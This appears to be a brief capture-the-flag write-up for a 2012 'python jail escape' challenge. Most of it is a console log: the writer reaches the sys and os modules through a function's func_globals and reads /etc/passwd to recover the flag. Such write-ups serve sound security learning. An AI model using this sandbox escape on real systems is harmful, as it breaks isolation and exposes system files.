---
title: PHDays2012 quals - pwn400 - python jail escape
author: zed
categories:
- writeup
---

## cat attack.log

~~~
#!python
>>> Reader.func_globals['sys']
<module 'sys' (built-in)>

>>> os=Reader.func_globals['sys'].modules['os']
os=Reader.func_globals['sys'].modules['os']
<module 'os' from '/usr/local/lib/python2.7/os.pyc'>

>>> f=os.open("/etc/passwd",444)
f=os.open("/etc/passwd",444)
6

>>> os.read(f,1024)
os.read(f,1024)
# $FreeBSD: src/etc/master.passwd,v 1.42.2.1.2.2 2012/11/17 08:36:10 svnexp Exp $
#
root:*:0:0:Charlie & flag 41f20268caa093e1b746e5ca750d3aa0:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/no
~~~

too easy.


#### related links

 * [Zed's PHDays 2012 files & exploits](https://github.com/zed-0xff/ctf/tree/master/2012.phdays-quals)
 * [Hack.lu CTF #7 - python jail](http://timiz0r.blogspot.ru/2012/11/hacklu-ctf-7-python-jail.html)
 * [Hack.lu CTF - Python Jail Writeup](http://codezen.fr/2012/10/25/hack-lu-ctf-python-jail-writeup/)
